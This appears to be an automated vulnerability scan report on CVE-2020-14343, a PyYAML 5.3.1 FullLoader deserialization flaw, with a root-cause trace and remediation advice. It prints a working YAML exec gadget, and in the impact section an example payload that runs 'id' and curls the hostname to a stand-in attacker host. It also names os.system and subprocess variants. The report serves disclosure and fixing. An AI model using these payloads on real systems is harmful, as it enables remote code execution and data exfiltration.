Description

pyyaml contains a deserialization of untrusted data weakness (CWE-502). An attacker who can control the input shown in the proof-of-concept can drive the component into unsafe behaviour; the scan reproduced this deterministically.

Attack walkthrough

  1. The scanner supplied a crafted input to pyyaml through its entry point (/work/entry /tmp/poc_cve_2020_14343.yaml).
  2. The input reached the vulnerable code path and triggered the deserialization of untrusted data condition.
  3. The detection oracle observed the dangerous operation actually occur and recorded a confirmed finding — see the proof section for the captured evidence.

Root cause

This is not a memory-safety bug — it is a language-level arbitrary-code-execution
primitive (Python object-injection / unsafe deserialization, CVE-2020-14343 class).
The detection oracle is synthetic: entry.py installs a PEP-578 audit hook
(_hook) that raises + os._exit(134) the instant deserialization reaches a
code-exec primitive. The abort here fired on the compile audit event.

What the attacker controls: the entire code string passed to exec(). The PoC
(/tmp/poc.bin) is the canonical FullLoader-bypass gadget:

!!python/object/new:type
args:
- x
- !!python/tuple []
- extend: !!python/name:exec
listitems: "0"

Mechanics, traced in /work/src/lib3/yaml/constructor.py:

  • construct_python_object_new (L658) → construct_python_object_apply(newobj=True) (L623).
  • make_python_instance (L579): cls = find_python_name("type") = builtins.type;

since newobj and cls is a type, it calls type.__new__(type, "x", (), {"extend": exec})
(L591) — this synthesizes a brand-new class named x whose extend attribute is the
builtin exec.

  • listitems is truthy ("0"), so L652 runs instance.extend(listitems) → x.extend("0")

→ exec("0").

Evidence of controllability: I varied the input. listitems: "0" → oracle detail
(b'0', '<string>'); listitems: "print(1+1)" → detail (b'print(1+1)', '<string>').
The bytes reaching compile/exec are verbatim attacker input of arbitrary length and
content. This is a WRITE-equivalent (executes attacker code), not a mere READ.

**Fully reachable from the real attack surface — this is a production API, not a harness
artifact.** The gadget travels the public path:

yaml.load(data, Loader=yaml.FullLoader) → __init__.py:112 FullLoader(stream) →
get_single_data() → FullConstructor multi-constructor dispatch → the python/object/new
tag handler registered at constructor.py:722-723 → construct_python_object_new (L658) →
construct_python_object_apply (L623) → instance.extend(listitems) (L652).

Preconditions: none beyond "the app calls yaml.load/yaml.full_load on attacker-controlled
bytes on PyYAML 5.3.1." No build flag, no test-only option, no non-default config. yaml.load
with no explicit Loader also defaults to FullLoader (__init__.py:108-110), so even the
naive yaml.load(data) is vulnerable. Input format is plain YAML text; entry point is any
file/stream/wire handler feeding the loader. The extend state-key blacklist
(constructor.py:486-487) only guards set_python_instance_state; this gadget smuggles
extend through the type(...) constructor args (the class namespace), completely
bypassing check_state_key. Fixed upstream in 5.4 by restricting FullLoader's tag set.

Impact

An attacker able to supply input to this component can exploit a deserialization of untrusted data issue in pyyaml. Because the scan confirmed it by executing the vulnerable code path — not by source review alone — the risk is demonstrated rather than theoretical. Confirmed severity: CRITICAL.

The primitive is already the impact — no escalation chain is needed:

  1. Attacker supplies the YAML gadget above with listitems set to any Python source, e.g.

"__import__('os').system('id; curl http://attacker/$(hostname)')".

  1. construct_python_object_apply synthesizes the type and invokes exec(<attacker source>)

at constructor.py:652.

  1. exec runs with the full privileges of the deserializing process: spawn subprocesses,

read /etc/passwd, open sockets for exfil/reverse shell, import os/subprocess/ctypes.
In this sandbox the audit oracle aborts at the compile step so the body is contained, but
in a real deployment (no audit hook) the code runs to completion.

Equivalent one-step gadgets exist (python/object/apply:os.system [...],
python/object/apply:subprocess.check_output [...]); the type/exec variant is used
because it defeats FullLoader's blacklist. Target "object" = the running Python process;
"field overwritten" = program control flow, replaced by attacker bytecode.

Remediation

  1. Deserialize with a safe loader only
    Location: the yaml.load call

    yaml.safe_load refuses to instantiate arbitrary Python objects — the exact behaviour that turns YAML deserialization into code execution. Never call the full/unsafe loader on untrusted input.

    # Vulnerable: yaml.load(data)  or  yaml.load(data, Loader=FullLoader)
import yaml
obj = yaml.safe_load(data)   # constructs only plain data types
  2. Upgrade the library

    Upgrade to the vendor-patched release (5.4 or later) and pin to it. Note a library upgrade fixes only the specific call path the vendor patched; verify every other sink that deserializes the same untrusted data is covered too, or apply the code-level fixes below to each.

  3. Isolate any required rich deserialization

    If complex objects are unavoidable, define an explicit allow-list of safe types or run deserialization in a sandboxed, least-privilege process.

  4. Add a regression test built from the proof-of-concept

    Turn the PoC in this report into an automated test so the fix is verified now and cannot silently regress later.
